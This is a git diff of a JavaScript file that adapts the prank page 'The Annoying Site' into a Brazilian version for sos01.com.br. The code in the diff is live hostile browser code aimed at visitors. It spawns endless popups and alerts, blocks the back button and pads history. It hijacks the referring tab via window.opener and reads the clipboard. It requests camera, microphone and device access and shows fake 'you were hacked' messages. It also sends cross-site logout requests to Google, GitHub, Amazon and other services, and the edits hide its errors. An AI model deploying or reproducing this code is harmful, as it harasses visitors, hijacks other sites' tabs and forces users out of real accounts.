@@ -1,16 +1,9 @@
 /* global Element */
 
 /**
- *  The Annoying Site
- *  https://theannoyingsite.com
- *
- *  Author:
- *    Feross Aboukhadijeh
- *    https://feross.org
- *
- *  Patreon:
- *    If you enjoyed this, please support me on Patreon!
- *    https://www.patreon.com/feross
+ *  sos01.com.br
+ *  Baseado em The Annoying Site (https://theannoyingsite.com) de Feross Aboukhadijeh
+ *  e na versão ptoszek.pl de Jaczup.
  */
 
 const SCREEN_WIDTH = window.screen.availWidth
@@ -21,6 +14,9 @@ const VELOCITY = 25
 const MARGIN = 15
 const TOP_MARGIN = 50
 const TICK_LENGTH = 50
+
+const SITE_NAME = 'sos01.com.br'
+const SITE_URL = 'https://sos01.com.br'
 
 const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;'
 
@@ -53,38 +49,48 @@ const SEARCHES = [
   'CUIdado onde voces clicammmm',
   'HA-HA-HA-HA-HA-HA-HA-HA-HA',
   'Cadeeeee o Caféeeeeee',
-  'Menino Ney é o melhor',
+  'Menino Ney é o melhor'
 ]
 
 const VIDEOS = [
-  'albundy.mp4',
-  'badger.mp4',
-  'cat.mp4',
-  'hasan.mp4',
-  'heman.mp4',
-  'jozin.mp4',
-  'nyan.mp4',
-  'rickroll.mp4',
-  'space.mp4',
-  'trolol.mp4'
+  'media/videos/szybkakaczka.mp4',
+  'media/videos/jaczup.mp4',
+  'media/videos/duck.mp4',
+  'media/videos/gratulacje.mp4',
+  'media/videos/golomb.mp4',
+  'media/videos/rickroll.mp4',
+  'media/videos/kaczuszka.mp4',
+  'media/videos/intro.mp4',
+  'media/videos/puddi.mp4',
+  'media/videos/clearmax.mp4',
+  'media/videos/freestrona.mp4',
+  'media/videos/mushbox.mp4',
+  'media/videos/ajhsdfhjasdbhfjasdfs.mp4'
 ]
 
 const FILE_DOWNLOADS = [
-  'cat-blue-eyes.jpg',
-  'cat-ceiling.jpg',
-  'cat-crosseyes.jpg',
-  'cat-cute.jpg',
-  'cat-hover.jpg',
-  'cat-marshmellows.jpg',
-  'cat-small-face.jpg',
-  'cat-smirk.jpg',
-  'patreon.png'
+  'media/images/ptok.jpg',
+  'media/images/ptokzjajami.jpeg',
+  'media/images/zimowyptoszek.jpeg',
+  'media/images/grubyptok.jpg',
+  'media/images/kichajacyptoszek.jpg',
+  'media/images/jaczup.jpg',
+  'media/images/ptiszka.jpg',
+  'media/images/ptakwspodniach.jpg',
+  'media/images/jaczupme.png',
+  'media/images/zlyptok.jpeg',
+  'media/images/ptoszek.jpg',
+  'media/images/lubieptoszki.png'
 ]
 
 const PHRASES = [
   'VOCE FOI HACKEADO',
   'VOCE NÃO VAI FUGIR',
-  
+  'CADE O CAFE',
+  'OI, TUDO BEM',
+  'NAO OLHA PRO LADO',
+  'JACZUP FOI AQUI',
+  'VISITA SOS01 PONTO COM PONTO BR'
 ]
 
 const LOGOUT_SITES = {
@@ -92,7 +98,7 @@ const LOGOUT_SITES = {
   'AOL 2': ['GET', 'https://api.screenname.aol.com/auth/logout?state=snslogout&r=' + Math.random()],
   Amazon: ['GET', 'https://www.amazon.com/gp/flex/sign-out.html?action=sign-out'],
   Blogger: ['GET', 'https://www.blogger.com/logout.g'],
-  Delicious: ['GET', 'https://www.delicious.com/logout'], // works!
+  Delicious: ['GET', 'https://www.delicious.com/logout'],
   DeviantART: ['POST', 'https://www.deviantart.com/users/logout'],
   DreamHost: ['GET', 'https://panel.dreamhost.com/index.cgi?Nscmd=Nlogout'],
   Dropbox: ['GET', 'https://www.dropbox.com/logout'],
@@ -100,7 +106,7 @@ const LOGOUT_SITES = {
   Gandi: ['GET', 'https://www.gandi.net/login/out'],
   GitHub: ['GET', 'https://github.com/logout'],
   GMail: ['GET', 'https://mail.google.com/mail/?logout'],
-  Google: ['GET', 'https://www.google.com/accounts/Logout'], // works!
+  Google: ['GET', 'https://www.google.com/accounts/Logout'],
   Hulu: ['GET', 'https://secure.hulu.com/logout'],
   Instapaper: ['GET', 'https://www.instapaper.com/user/logout'],
   Linode: ['GET', 'https://manager.linode.com/session/logout'],
@@ -144,29 +150,20 @@ let interactionCount = 0
 let numSuperLogoutIframes = 0
 
 /**
- * Is this window a child window? A window is a child window if there exists a
- * parent window (i.e. the window was opened by another window so `window.opener`
- * is set) *AND* that parent is a window on the same origin (i.e. the window was
- * opened by us, not an external website)
+ * Ignora promessas rejeitadas e exceções de APIs que nem existem no navegador.
  */
+function silent (promise) {
+  if (promise && typeof promise.catch === 'function') promise.catch(() => {})
+  return promise
+}
+
 const isChildWindow = (window.opener && isParentSameOrigin()) ||
   window.location.search.indexOf('child=true') !== -1
 
-/**
- * Is this window a parent window?
- */
 const isParentWindow = !isChildWindow
 
-/*
- * Run this code in all windows, *both* child and parent windows.
- */
 init()
 
-/*
- * Use `window.opener` to detect if this window was opened by another window, which
- * will be its parent. The `window.opener` variable is a reference to the parent
- * window.
- */
 if (isChildWindow) initChildWindow()
 else initParentWindow()
 
@@ -179,13 +176,9 @@ function init () {
   interceptUserInput(event => {
     interactionCount += 1
 
-    // Prevent default behavior (breaks closing window shortcuts)
     event.preventDefault()
     event.stopPropagation()
 
-    // 'touchstart' and 'touchend' events are not able to open a new window
-    // (at least in Chrome), so don't even try. Checking `event.which !== 0` is just
-    // a clever way to exclude touch events.
     if (event.which !== 0) openWindow()
 
     startVibrateInterval()
@@ -241,7 +234,7 @@ function initChildWindow () {
   rainbowThemeColor()
   animateUrlWithEmojis()
 
-  interceptUserInput(event => {
+  interceptUserInput(() => {
     if (interactionCount === 1) {
       startAlertInterval()
     }
@@ -257,7 +250,7 @@ function initParentWindow () {
   fillHistory()
   startInvisiblePictureInPictureVideo()
 
-  interceptUserInput(event => {
+  interceptUserInput(() => {
     // Only run these on the first interaction
     if (interactionCount === 1) {
       registerProtocolHandlers()
@@ -269,17 +262,14 @@ function initParentWindow () {
       removeHelloMessage()
       rainbowThemeColor()
       animateUrlWithEmojis()
-      speak('That was a mistake')
+      speak('Isso foi um erro')
     }
   })
 }
 
 /**
- * Sites that link to theannoyingsite.com may specify `target='_blank'` to open the
- * link in a new window. For example, Messenger.com from Facebook does this.
- * However, that means that `window.opener` will be set, which allows us to redirect
- * that window. YES, WE CAN REDIRECT THE SITE THAT LINKED TO US.
- * Learn more here: https://www.jitbit.com/alexblog/256-targetblank---the-most-underestimated-vulnerability-ever/
+ * Sites que apontam para cá com target='_blank' deixam window.opener setado,
+ * o que permite redirecionar a página de quem fez o link.
  */
 function attemptToTakeoverReferrerWindow () {
   if (isParentWindow && window.opener && !isParentSameOrigin()) {
@@ -288,13 +278,10 @@ function attemptToTakeoverReferrerWindow () {
 }
 
 /**
- * Returns true if the parent window is on the same origin. It's not enough to check
- * that `window.opener` is set, because that will also get set if a site on a
- * different origin links to theannoyingsite.com with `target='_blank'`.
+ * Returns true if the parent window is on the same origin.
  */
 function isParentSameOrigin () {
   try {
-    // May throw an exception if `window.opener` is on another origin
     return window.opener.location.origin === window.location.origin
   } catch (err) {
     return false
@@ -302,13 +289,11 @@ function isParentSameOrigin () {
 }
 
 /**
- * Ask the user "are you sure you want to leave this page?". In most browsers,
- * this will not actually do anything unless the user has at least one interaction
- * with the page before they close it.
+ * Ask the user "are you sure you want to leave this page?".
  */
 function confirmPageUnload () {
   window.addEventListener('beforeunload', event => {
-    speak('Please don\'t go!')
+    speak('Não vai embora!')
     event.returnValue = true
   })
 }
@@ -321,38 +306,21 @@ function registerProtocolHandlers () {
   if (typeof navigator.registerProtocolHandler !== 'function') return
 
   const protocolWhitelist = [
-    'bitcoin',
-    'geo',
-    'im',
-    'irc',
-    'ircs',
-    'magnet',
-    'mailto',
-    'mms',
-    'news',
-    'ircs',
-    'nntp',
-    'sip',
-    'sms',
-    'smsto',
-    'ssh',
-    'tel',
-    'urn',
-    'webcal',
-    'wtai',
-    'xmpp'
+    'bitcoin', 'geo', 'im', 'irc', 'ircs', 'magnet', 'mailto', 'mms', 'news',
+    'nntp', 'sip', 'sms', 'smsto', 'ssh', 'tel', 'urn', 'webcal', 'wtai', 'xmpp'
   ]
 
-  const handlerUrl = window.location.href + '/url=%s'
+  const handlerUrl = window.location.origin + window.location.pathname + '?u=%s'
 
   protocolWhitelist.forEach(proto => {
-    navigator.registerProtocolHandler(proto, handlerUrl, 'The Annoying Site')
+    try {
+      silent(navigator.registerProtocolHandler(proto, handlerUrl, SITE_NAME))
+    } catch (err) {}
   })
 }
 
 /**
- * Attempt to access the user's camera and microphone, and attempt to enable the
- * torch (i.e. camera flash) if the device has one.
+ * Attempt to access the user's camera and microphone, and enable the torch.
  */
 function requestCameraAndMic () {
   if (!navigator.mediaDevices ||
@@ -360,32 +328,31 @@ function requestCameraAndMic () {
     return
   }
 
-  navigator.mediaDevices.enumerateDevices().then(devices => {
-    const cameras = devices.filter((device) => device.kind === 'videoinput')
+  silent(navigator.mediaDevices.enumerateDevices().then(devices => {
+    const cameras = devices.filter(device => device.kind === 'videoinput')
 
     if (cameras.length === 0) return
     const camera = cameras[cameras.length - 1]
 
-    navigator.mediaDevices.getUserMedia({
+    silent(navigator.mediaDevices.getUserMedia({
       deviceId: camera.deviceId,
       facingMode: ['user', 'environment'],
       audio: true,
       video: true
     }).then(stream => {
       const track = stream.getVideoTracks()[0]
+      if (!window.ImageCapture) return
       const imageCapture = new window.ImageCapture(track)
 
-      imageCapture.getPhotoCapabilities().then(() => {
-        // Let there be light!
+      silent(imageCapture.getPhotoCapabilities().then(() => {
         track.applyConstraints({ advanced: [{ torch: true }] })
-      }, () => { /* No torch on this device */ })
-    }, () => { /* ignore errors */ })
-  })
+      }, () => {}))
+    }, () => {}))
+  }, () => {}))
 }
 
 /**
  * Animating the URL with emojis
- * See: https://matthewrayfield.com/articles/animating-urls-with-javascript-and-emojis/
  */
 function animateUrlWithEmojis () {
   if (window.ApplePaySession) {
@@ -473,22 +440,22 @@ function animateUrlWithEmojis () {
 
 /**
  * Lock the user's pointer, without even being in full screen!
- * Require user-initiated event.
  */
 function requestPointerLock () {
-  const requestPointerLockApi = (
-    document.body.requestPointerLock ||
-    document.body.webkitRequestPointerLock ||
-    document.body.mozRequestPointerLock ||
-    document.body.msRequestPointerLock
-  )
+  try {
+    const requestPointerLockApi = (
+      (document.body.requestPointerLock && document.body.requestPointerLock.bind(document.body)) ||
+      (document.body.webkitRequestPointerLock && document.body.webkitRequestPointerLock.bind(document.body)) ||
+      (document.body.mozRequestPointerLock && document.body.mozRequestPointerLock.bind(document.body)) ||
+      (document.body.msRequestPointerLock && document.body.msRequestPointerLock.bind(document.body))
+    )
 
-  requestPointerLockApi.call(document.body)
+    if (requestPointerLockApi) silent(requestPointerLockApi())
+  } catch (err) {}
 }
 
 /**
  * Start vibrating the device at random intervals, on supported devices.
- * Requires user-initiated event.
  */
 function startVibrateInterval () {
   if (typeof window.navigator.vibrate !== 'function') return
@@ -497,17 +464,16 @@ function startVibrateInterval () {
     window.navigator.vibrate(duration)
   }, 1000)
 
-  // If the gamepad can vibrate, we will at random intervals every second. And at random strengths!
-  window.addEventListener('gamepadconnected', (event) => {
+  window.addEventListener('gamepadconnected', event => {
     const gamepad = event.gamepad
     if (gamepad.vibrationActuator) {
       setInterval(() => {
         if (gamepad.connected) {
-          gamepad.vibrationActuator.playEffect('dual-rumble', {
+          silent(gamepad.vibrationActuator.playEffect('dual-rumble', {
             duration: Math.floor(Math.random() * 600),
             strongMagnitude: Math.random(),
             weakMagnitude: Math.random()
-          })
+          }))
         }
       }, 1000)
     }
@@ -515,7 +481,7 @@ function startVibrateInterval () {
 }
 
 /**
- * Intercept all user-initiated events and call the given the function, `onInput`.
+ * Intercept all user-initiated events and call the given function, `onInput`.
  */
 function interceptUserInput (onInput) {
   document.body.addEventListener('touchstart', onInput, { passive: false })
@@ -530,7 +496,7 @@ function interceptUserInput (onInput) {
 }
 
 /**
- * Start an invisible, muted video so we have a one ready to put into
+ * Start an invisible, muted video so we have one ready to put into
  * picture-in-picture mode on the first user-interaction.
  */
 function startInvisiblePictureInPictureVideo () {
@@ -538,25 +504,25 @@ function startInvisiblePictureInPictureVideo () {
   video.src = getRandomArrayEntry(VIDEOS)
   video.loop = true
   video.muted = true
+  video.playsInline = true
+  video.preload = 'auto'
   video.style = HIDDEN_STYLE
   video.autoplay = true
-  video.play()
+  silent(video.play())
 
   document.body.appendChild(video)
 }
 
 /**
- * Active Safari's picture-in-picture feature, which let's show a video on the
- * desktop. Requires user-initiated event.
+ * Activate Safari's picture-in-picture feature. Requires user-initiated event.
  */
 function enablePictureInPicture () {
   const video = document.querySelector('video')
-  if (document.pictureInPictureEnabled) {
-    video.style = ''
-    video.muted = false
-    video.requestPictureInPicture()
-    video.play()
-  }
+  if (!video || !document.pictureInPictureEnabled) return
+
+  video.style = ''
+  video.muted = false
+  silent(video.requestPictureInPicture().then(() => silent(video.play()), () => {}))
 }
 
 /**
@@ -574,7 +540,7 @@ function focusWindows () {
 function openWindow () {
   const { x, y } = getRandomCoords()
   const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
-  const win = window.open(window.location.pathname, '', opts)
+  const win = window.open(window.location.pathname + '?child=true', '', opts)
 
   // New windows may be blocked by the popup blocker
   if (!win) return
@@ -591,15 +557,13 @@ function hideCursor () {
 }
 
 /**
- * Trigger a file download immediately. One file download is allowed *without* user
- * interaction. Further file downloads should happen in response to a user-initiated
- * event or they will be blocked.
+ * Trigger a file download immediately.
  */
 function triggerFileDownload () {
   const fileName = getRandomArrayEntry(FILE_DOWNLOADS)
   const a = document.createElement('a')
   a.href = fileName
-  a.download = fileName
+  a.download = fileName.split('/').pop()
   a.click()
 }
 
@@ -607,17 +571,20 @@ function triggerFileDownload () {
  * Speak the given `phrase` using text-to-speech.
  */
 function speak (phrase) {
+  if (!window.speechSynthesis) return
   if (phrase == null) phrase = getRandomArrayEntry(PHRASES)
-  window.speechSynthesis.speak(new window.SpeechSynthesisUtterance(phrase))
+  silent(window.speechSynthesis.speak(new window.SpeechSynthesisUtterance(phrase)))
 }
 
 /**
- * Start an annoying theramin that changes pitch and volume depending on
- * the mouse position. Uses a Web Audio oscillator. Reauires user-initiated
- * event.
- * Based on https://github.com/feross/TheAnnoyingSite.com/pull/2
+ * Start an annoying theramin that changes pitch and volume depending on the
+ * mouse position. Uses ONE AudioContext: o navegador limita a ~6 contextos.
  */
+let theraminStarted = false
 function startTheramin () {
+  if (theraminStarted) return
+  theraminStarted = true
+
   const audioContext = new AudioContext()
   const oscillatorNode = audioContext.createOscillator()
   const gainNode = audioContext.createGain()
@@ -642,6 +609,8 @@ function startTheramin () {
     gainNode.gain.value = volume * 0.5
   }
 
+  silent(audioContext.resume())
+
   document.body.addEventListener('mousemove', event => {
     const { clientX, clientY } = event
     const { clientWidth, clientHeight } = document.body
@@ -652,80 +621,64 @@ function startTheramin () {
 }
 
 /**
- * Attempt to read the user's clipboard.
- * Requires user-initiated event.
+ * Attempt to read the user's clipboard. Requires user-initiated event.
  */
 function requestClipboardRead () {
   try {
-    navigator.clipboard.readText().then(
+    silent(navigator.clipboard.readText().then(
       data => {
         if (!window.ApplePaySession) {
           // Don't alert in Safari because it blocks the event loop
-          window.alert("Successfully read data from clipboard: '" + data + "'")
+          window.alert("Li sua área de transferência: '" + data + "'")
         }
       },
       () => {}
-    )
-  } catch {}
+    ))
+  } catch (err) {}
 }
 
 /**
- * Request Webauthn attestation.
- * Requires user-initiated event.
+ * Request Webauthn attestation. Requires user-initiated event.
  */
 function requestWebauthnAttestation () {
   try {
-    // From https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API
-    // This code is public domain, per https://developer.mozilla.org/en-US/docs/MDN/About#Copyrights_and_licenses
+    if (!navigator.credentials) return
 
-    // sample arguments for registration
     const createCredentialDefaultArgs = {
       publicKey: {
-      // Relying Party (a.k.a. - Service):
         rp: {
-          name: 'Acme'
+          name: SITE_NAME
         },
-
-        // User:
         user: {
           id: new Uint8Array(16),
-          name: 'YOU_ARE_HACKED@THEANNOYINGSITE.COM',
-          displayName: 'YOU ARE HACKED'
+          name: 'VOCE_FOI_HACKEADO@SOS01.COM.BR',
+          displayName: 'VOCE FOI HACKEADO'
         },
-
         pubKeyCredParams: [{
           type: 'public-key',
           alg: -7
         }],
-
         attestation: 'direct',
-
         timeout: 60000,
-
-        challenge: new Uint8Array([ // must be a cryptographically random number sent from a server
+        challenge: new Uint8Array([
           0x8C, 0x0A, 0x26, 0xFF, 0x22, 0x91, 0xC1, 0xE9, 0xB9, 0x4E, 0x2E, 0x17, 0x1A, 0x98, 0x6A, 0x73,
           0x71, 0x9D, 0x43, 0x48, 0xD5, 0xA7, 0x6A, 0x15, 0x7E, 0x38, 0x94, 0x52, 0x77, 0x97, 0x0F, 0xEF
         ]).buffer
       }
     }
 
-    // sample arguments for login
     const getCredentialDefaultArgs = {
       publicKey: {
         timeout: 60000,
-        // allowCredentials: [newCredential] // see below
-        challenge: new Uint8Array([ // must be a cryptographically random number sent from a server
+        challenge: new Uint8Array([
           0x79, 0x50, 0x68, 0x71, 0xDA, 0xEE, 0xEE, 0xB9, 0x94, 0xC3, 0xC2, 0x15, 0x67, 0x65, 0x26, 0x22,
           0xE3, 0xF3, 0xAB, 0x3B, 0x78, 0x2E, 0xD5, 0x6F, 0x81, 0x26, 0xE2, 0xA6, 0x01, 0x7D, 0x74, 0x50
         ]).buffer
       }
     }
 
-    // register / create a new credential
-    navigator.credentials.create(createCredentialDefaultArgs)
-      .then((cred) => {
-      // normally the credential IDs available for an account would come from a server
-      // but we can just copy them from above...
+    silent(navigator.credentials.create(createCredentialDefaultArgs)
+      .then(cred => {
         const idList = [{
           id: cred.rawId,
           transports: ['usb', 'nfc', 'ble'],
@@ -733,65 +686,54 @@ function requestWebauthnAttestation () {
         }]
         getCredentialDefaultArgs.publicKey.allowCredentials = idList
         return navigator.credentials.get(getCredentialDefaultArgs)
-      })
-  } catch {}
+      }, () => {}))
+  } catch (err) {}
 }
 
 /**
  * Request access to MIDI devices.
- * Requires user-initiated event.
  */
 function requestMidiAccess () {
   try {
-    navigator.requestMIDIAccess({
-      sysex: true
-    })
-  } catch {}
+    silent(navigator.requestMIDIAccess({ sysex: true }))
+  } catch (err) {}
 }
 
 /**
  * Request access to Bluetooth devices.
- * Requires user-initiated event.
  */
 function requestBluetoothAccess () {
   try {
-    navigator.bluetooth.requestDevice({
-      // filters: [...] <- Prefer filters to save energy & show relevant devices.
-      // acceptAllDevices here ensures dialog can populate, we don't care with what.
-      acceptAllDevices: true
-    })
-      .then(device => device.gatt.connect())
-  } catch {}
+    silent(navigator.bluetooth.requestDevice({ acceptAllDevices: true })
+      .then(device => device.gatt.connect(), () => {}))
+  } catch (err) {}
 }
 
 /**
  * Request access to USB devices.
- * Requires user-initiated event.
  */
 function requestUsbAccess () {
   try {
-    navigator.usb.requestDevice({ filters: [{}] })
-  } catch {}
+    silent(navigator.usb.requestDevice({ filters: [{}] }))
+  } catch (err) {}
 }
 
 /**
  * Request access to Serial devices.
- * Requires user-initiated event.
  */
 function requestSerialAccess () {
   try {
-    navigator.serial.requestPort({ filters: [] })
-  } catch {}
+    silent(navigator.serial.requestPort({ filters: [] }))
+  } catch (err) {}
 }
 
 /**
  * Request access to HID devices.
- * Requires user-initiated event.
  */
 function requestHidAccess () {
   try {
-    navigator.hid.requestDevice({ filters: [] })
-  } catch {}
+    silent(navigator.hid.requestDevice({ filters: [] }))
+  } catch (err) {}
 }
 
 /**
@@ -834,18 +776,23 @@ function startVideo () {
   video.src = getRandomArrayEntry(VIDEOS)
   video.autoplay = true
   video.loop = true
+  video.muted = false
+  video.playsInline = true
   video.style = 'width: 100%; height: 100%;'
+
+  silent(video.play())
 
   document.body.appendChild(video)
 }
 
 /**
- * When a child window closes, notify the parent window so it can remove it from
- * the list of child windows.
+ * When a child window closes, notify the parent window.
  */
 function detectWindowClose () {
   window.addEventListener('unload', () => {
-    if (!window.opener.closed) window.opener.onCloseWindow(window)
+    if (window.opener && !window.opener.closed && window.opener.onCloseWindow) {
+      window.opener.onCloseWindow(window)
+    }
   })
 }
 
@@ -858,10 +805,11 @@ function onCloseWindow (win) {
 }
 
 /**
- * Show the unsuspecting user a friendly hello message with a cat.
+ * Show the unsuspecting user a friendly hello message.
  */
 function showHelloMessage () {
   const template = document.querySelector('template')
+  if (!template) return
   const clone = document.importNode(template.content, true)
   document.body.appendChild(clone)
 }
@@ -871,11 +819,12 @@ function showHelloMessage () {
  */
 function removeHelloMessage () {
   const helloMessage = document.querySelector('.hello-message')
-  helloMessage.remove()
+  if (helloMessage) helloMessage.remove()
 }
 
 /**
  * Change the theme color of the browser in a loop.
+ * O HTML usa <meta name="theme-color">, então o seletor tem que ser por [name=...].
  */
 function rainbowThemeColor () {
   function zeroFill (width, number, pad = '0') {
@@ -884,29 +833,29 @@ function rainbowThemeColor () {
     return number + ''
   }
 
-  const meta = document.querySelector('meta.theme-color')
+  const meta = document.querySelector('meta[name="theme-color"]')
+  if (!meta) return
   setInterval(() => {
     meta.setAttribute('content', '#' + zeroFill(6, Math.floor(Math.random() * 16777215).toString(16)))
   }, 50)
 }
 
 /**
- * Copy cat pictures onto the user's clipboard. Requires user-initiated event.
+ * Copy spam onto the user's clipboard. Requires user-initiated event.
  */
 function copySpamToClipboard () {
-  const randomArt = getRandomArrayEntry(ART) + '\nCheck out https://theannoyingsite.com'
+  const randomArt = getRandomArrayEntry(ART) + `\nCheck out ${SITE_URL}`
   clipboardCopy(randomArt)
 }
 
 /**
- * Copy given text, `text`, onto the user's clipboard.
- * Requires user-initiated event.
+ * Copy given text onto the user's clipboard. Requires user-initiated event.
  */
 function clipboardCopy (text) {
   // A <span> contains the text to copy
   const span = document.createElement('span')
   span.textContent = text
-  span.style.whiteSpace = 'pre' // Preserve consecutive spaces and newlines
+  span.style.whiteSpace = 'pre'
 
   // An <iframe> isolates the <span> from the page's styles
   const iframe = document.createElement('iframe')
@@ -933,9 +882,7 @@ function clipboardCopy (text) {
   let success = false
   try {
     success = win.document.execCommand('copy')
-  } catch (err) {
-    console.log(err)
-  }
+  } catch (err) {}
 
   selection.removeAllRanges()
   span.remove()
@@ -945,9 +892,7 @@ function clipboardCopy (text) {
 }
 
 /**
- * Show a modal dialog at a regular interval. Modals capture focus from other OS apps and browser tabs.
- * Except in Chrome 64+, where modals can only capture focus from other OS apps,
- * but not from other tabs.
+ * Show a modal dialog at a regular interval.
  */
 function startAlertInterval () {
   setInterval(() => {
@@ -960,7 +905,7 @@ function startAlertInterval () {
 }
 
 /**
- * Show an alert with 1000's of lines of cat ASCII art.
+ * Show an alert with 1000's of lines of ASCII art.
  */
 function showAlert () {
   const randomArt = getRandomArrayEntry(ART)
@@ -972,17 +917,18 @@ function showAlert () {
  * Fullscreen the browser window
  */
 function requestFullscreen () {
-  const requestFullscreen = Element.prototype.requestFullscreen ||
-    Element.prototype.webkitRequestFullscreen ||
-    Element.prototype.mozRequestFullScreen ||
-    Element.prototype.msRequestFullscreen
+  try {
+    const requestFullscreen = Element.prototype.requestFullscreen ||
+      Element.prototype.webkitRequestFullscreen ||
+      Element.prototype.mozRequestFullScreen ||
+      Element.prototype.msRequestFullscreen
 
-  requestFullscreen.call(document.body)
+    if (requestFullscreen) silent(requestFullscreen.call(document.body))
+  } catch (err) {}
 }
 
 /**
- * Log the user out of top sites they're logged into, including Google.com.
- * Inspired by https://superlogout.com
+ * Log the user out of top sites they're logged into.
  */
 function superLogout () {
   function cleanup (el, delayCleanup) {
@@ -1035,6 +981,9 @@ function superLogout () {
     document.body.appendChild(form)
     form.submit()
   }
+
+  const logoutMessages = document.querySelector('.logout-messages')
+
   for (const name in LOGOUT_SITES) {
     const method = LOGOUT_SITES[name][0]
     const url = LOGOUT_SITES[name][1]
@@ -1046,16 +995,16 @@ function superLogout () {
       post(url, params)
     }
 
-    const div = document.createElement('div')
-    div.innerText = `Logging you out from ${name}...`
-
-    const logoutMessages = document.querySelector('.logout-messages')
-    logoutMessages.appendChild(div)
+    if (logoutMessages) {
+      const div = document.createElement('div')
+      div.innerText = `Deslogando você de ${name}...`
+      logoutMessages.appendChild(div)
+    }
   }
 }
 
 /**
- * Disable the back button. If the user goes back, send them one page forward ;-)
+ * Disable the back button.
  */
 function blockBackButton () {
   window.addEventListener('popstate', () => {
@@ -1064,20 +1013,17 @@ function blockBackButton () {
 }
 
 /**
- * Fill the history with extra entries for this site, to make it harder to find
- * the previous site in the back button's dropdown menu.
+ * Fill the history with extra entries for this site.
  */
 function fillHistory () {
   for (let i = 1; i < 20; i++) {
     window.history.pushState({}, '', window.location.pathname + '?q=' + i)
   }
-  // Set location back to the initial location, so user does not notice
   window.history.pushState({}, '', window.location.pathname)
 }
 
 /**
- * Get random x, y coordinates for a new window on the screen. Takes into account
- * screen size, window size, and leaves a safe margin on all sides.
+ * Get random x, y coordinates for a new window on the screen.
  */
 function getRandomCoords () {
   const x = MARGIN +
@@ -1094,7 +1040,9 @@ function getRandomArrayEntry (arr) {
   return arr[Math.floor(Math.random() * arr.length)]
 }
 
-// TODO: document this
+/**
+ * Turn one of the popups into a Bing search window cycling through SEARCHES.
+ */
 function setupSearchWindow (win) {
   if (!win) return
   const { x, y } = getRandomCoords()
@@ -1109,7 +1057,7 @@ function setupSearchWindow (win) {
       return
     }
 
-    win.window.location = window.location.pathname
+    win.window.location = window.location.pathname + '?child=true'
     setTimeout(() => {
       win.resizeTo(WIN_WIDTH, WIN_HEIGHT)
     }, 500)
@@ -1127,36 +1075,17 @@ function setupSearchWindow (win) {
   }, 3000)
 }
 
-function detectBrowser() {
-  const userAgent = navigator.userAgent;
-  const isIOS = /iPhone|iPad|iPod/i.test(userAgent);
+function detectBrowser () {
+  const userAgent = navigator.userAgent
+  const isIOS = /iPhone|iPad|iPod/i.test(userAgent)
 
-  // 1. Verificações de navegadores específicos que têm identificadores únicos
-  if (/samsungbrowser\//i.test(userAgent)) {
-    return 'samsung';
-  } else if (/edg\//i.test(userAgent) || /edga\//i.test(userAgent)) {
-    return 'edge';
-  } else if (/opr\//i.test(userAgent) || /opt\//i.test(userAgent)) {
-    return 'opera';
-  } else if (/firefox\//i.test(userAgent)) {
-    return 'firefox';
-  } 
-  
-  // 2. Verificação de Chrome (No iOS, o Chrome usa 'CriOS')
-  else if (/chrome\//i.test(userAgent) || /CriOS/i.test(userAgent)) {
-    return 'chrome';
-  } 
-  
-  // 3. Verificação de Safari (Geralmente o padrão no iOS se não for Chrome ou Opera)
-  else if (/safari\//i.test(userAgent)) {
-    // Se for iOS e não caiu no Chrome/Opera, é o Safari nativo
-    return isIOS ? 'safari' : 'safari'; 
-  }
+  if (/samsungbrowser\//i.test(userAgent)) return 'samsung'
+  if (/edg\//i.test(userAgent) || /edga\//i.test(userAgent)) return 'edge'
+  if (/opr\//i.test(userAgent) || /opt\//i.test(userAgent)) return 'opera'
+  if (/firefox\//i.test(userAgent)) return 'firefox'
+  if (/chrome\//i.test(userAgent) || /CriOS/i.test(userAgent)) return 'chrome'
+  if (/safari\//i.test(userAgent)) return 'safari'
+  if (isIOS) return 'ios-device'
 
-  // 4. Fallback para detectar se é apenas um dispositivo iOS genérico
-  if (isIOS) {
-    return 'ios-device'; // Pode ser o Safari padrão do iPhone
-  }
-
-  return 'unknown';
-}
+  return 'unknown'
+                                             }
